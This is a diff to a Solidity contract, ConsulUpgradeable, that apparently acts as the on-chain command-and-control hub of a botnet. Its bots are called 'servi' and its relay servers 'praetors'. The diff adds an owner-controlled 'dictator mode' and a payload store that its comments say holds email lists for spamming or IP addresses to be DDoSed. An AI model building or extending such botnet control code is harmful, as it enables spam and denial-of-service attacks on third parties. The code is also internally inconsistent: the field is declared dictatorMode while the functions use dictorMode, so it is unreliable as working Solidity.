@@ -14,6 +14,16 @@ contract ConsulUpgradeable is Initializable, UUPSUpgradeable, AccessControlUpgra
     bytes32 public constant CONTROLLER_ROLE = keccak256("CONTROLLER_ROLE");
 
     /**
+     * @dev When dictator mode is enabled the servi will only execute
+     * with this contract. This is useful redundancy in case the praeators
+     * are compromised. This will come at the cost of increased gas costs
+     * and most likely a reduction in features and capabilities. This will
+     * however allow the owner to maintain control of the servi, until
+     * preators are restored in the provinces.
+     */
+    bool internal dictatorMode = false;
+
+    /**
      * @dev Set the current command to default to REPORT on deployment
      * NOTE: As the servi are deployed from resourses the owner controls
      * we can assume they will know what the corrasponding hash means
@@ -24,6 +34,14 @@ contract ConsulUpgradeable is Initializable, UUPSUpgradeable, AccessControlUpgra
      * @dev Histroical record of commands
      */
     bytes32[] internal commandHistory;
+
+    /**
+     * @dev A mapping of payloads to be executed by the servus
+     * these could be email list for spamming, or a list of
+     * ip addresses to be ddosed.
+     * This is for dictator mode
+     */
+    mapping(bytes32 => bytes[]) internal payloads;
 
     /**
      * @dev Struct to hold the details of a praetor server
@@ -102,6 +120,11 @@ contract ConsulUpgradeable is Initializable, UUPSUpgradeable, AccessControlUpgra
      * @dev Event for the deactivation of a praetor
      */
     event PraetorDeactivated(bytes32 indexed praetorId);
+
+    /**
+     * @dev Event for the instatution of dictator mode
+     */
+    event DictatorModeEnabled(bool indexed dictatorMode);
 
     function initialize() public initializer {
         _setupRole(OWNER_ROLE, msg.sender);
@@ -214,6 +237,45 @@ contract ConsulUpgradeable is Initializable, UUPSUpgradeable, AccessControlUpgra
      */
     function getCommandHistoryLength() external view returns (uint256) {
         return commandHistory.length;
+    }
+
+    /**
+     * @dev Returns the state of the dictorship
+     */
+    function getDictorMode() external view returns (bool) {
+        return dictorMode;
+    }
+
+    /**
+     * @dev Allows owner to toggle dictor mode
+     */
+    function toggleDictorMode() external onlyOwner {
+        dictorMode = !dictorMode;
+        emit DictatorModeEnabled(dictorMode);
+    }
+
+    /**
+     * @dev Returns payload
+     * @param _payloadId The id of the payload
+     */
+    function getPayload(bytes32 _payloadId) external view returns (bytes[] memory) {
+        return payloads[_payloadId];
+    }
+
+    /**
+     * @dev Allows controllers to add a payload as long as it doesn't write
+     * over an existing payload
+     */
+    function addPayload(bytes32 _payloadId, bytes[] memory _payload) external onlyController {
+        require(payloads[_payloadId].length == 0, "Payload already exists");
+        payloads[_payloadId] = _payload;
+    }
+
+    /**
+     * @dev Allows owner to remove a payload
+     */
+    function removePayload(bytes32 _payloadId) external onlyOwner {
+        delete payloads[_payloadId];
     }
 
     /** @dev Protected UUPS upgrade authorization fuction */
